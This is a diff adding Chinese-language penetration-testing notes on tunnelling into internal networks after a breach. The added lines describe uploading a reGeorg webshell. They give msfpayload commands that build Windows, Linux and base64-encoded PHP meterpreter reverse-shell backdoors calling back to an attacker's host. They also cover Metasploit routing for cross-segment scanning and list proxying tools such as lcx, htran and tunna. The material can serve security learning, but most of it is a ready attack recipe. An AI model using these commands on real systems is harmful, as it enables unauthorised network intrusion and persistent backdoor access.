@@ -27,3 +27,36 @@
     有时候，我们手边没有端口转发的工具，也可以通过ssh来做端口转发
     ssh -CfNg -L port1:127.0.0.1:port2 user@host    #本地转发
     ssh -CfNg -R port2:127.0.0.1:port1 user@host    #远程转发
+
+    2.2 通过HTTP service的代理
+    简单来说就是在目标服务器上传一个webshell，通过shell来做所有的流量转发到内网，常见的几个工具有reGeorg，meterpreter，tunna等等，甚
+    至直接写一个简单的代理脚本，在自己机器上配置一下nginx直接进行反向代理
+        reGeorg自带的说明已经很清楚了
+            Step 1. Upload tunnel.(aspx|ashx|jsp|php) to a webserver (How you do that is up to you)
+            Step 2. Configure you tools to use a socks proxy, use the ip address and port you specified when you started the reGeorgSocksProxy.py
+        ** Note, if you tools, such as NMap doesn't support socks proxies, use [proxychains] (see wiki)
+            Step 3. Hack the planet :)
+    注意安装urllib3即可（regeorg很方便，我基本都用这个）
+        meterpreter
+    msf非常强大，在进行内网渗透的时候不失为一个好的选择，要用它进行代理，可以直接生成一个可执行文件后门，然后返回meterpreter，也可以生成一个webshell来返回meterpreter，关于meterpreter，Dm老师已经说的非常清楚了metasploit 渗透测试笔记(meterpreter篇)
+
+    windows生成后门
+    msfpayload windows/meterpreter/reverse_tcp LHOST=<Your IP Address> LPORT=<Your Port to Connect On> X > shell.exe
+     Linux生成后门
+    msfpayload linux/x86/meterpreter/reverse_tcp LHOST=<Your IP Address> LPORT=<Your Port to Connect On> R | msfencode -t elf -o shell
+     php后门
+    msfpayload php/meterpreter/reverse_tcp LHOST=<Your IP Address> LPORT=<Your Port to Connect On> R | msfencode -e php/base64(可简单编码) -t raw -o base64php.php
+    获得meterpreter会话后，就是msf尽情施展的时候了，最常用的办法，添加路由表后，直接在会话中用msf的各种攻击模块进行扫描（注意，这里是可以进行跨网段扫描的）
+    如果单纯只是想要进行简单的代理工作，auxiliary/server/socks4a模块即可
+    这里讲到meterpreter所以多说一句，之前说的ssh隧道，如果嫌命令难得记，也可以简单的通过msf来建立tunnel
+    load meta_ssh
+    use multi/ssh/login_password
+    设置好参数后exploit即可获取会话进行代理操作
+        直接通过webshell和nginx反向代理
+    http://zone.wooyun.org/content/11096
+ 
+    2.3. other tricks
+    python，ruby，perl等直接建立socks连接
+    lcx，tunna，htran等等进行端口流量转发
+    shadowsocks，tor，goagent等等
+    直接现成的小东西：ssocks（网址：https://sourceforge.net/projects/ssocks/）正向代理，反弹socks5均可
